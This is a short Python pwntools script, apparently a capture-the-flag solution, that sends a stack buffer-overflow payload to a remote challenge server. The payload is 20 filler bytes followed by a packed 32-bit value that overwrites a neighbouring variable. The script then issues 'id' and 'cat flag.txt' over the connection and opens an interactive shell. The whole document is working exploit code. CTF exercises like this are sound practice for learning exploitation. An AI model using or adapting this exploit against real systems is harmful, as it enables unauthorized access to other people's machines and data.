from pwn import *


context.update(arch="amd64", os="linux")

# Fill input string and overwrite the value in the next int (i.e., 32 bits)
# variables in the stack
payload = b"A" * (20)
payload += p32(5134160)

process = remote("ctf.tcp1p.com", 17027)

process.clean()
process.sendline(payload)
process.sendline('id');process.sendline('cat flag.txt')
process.interactive()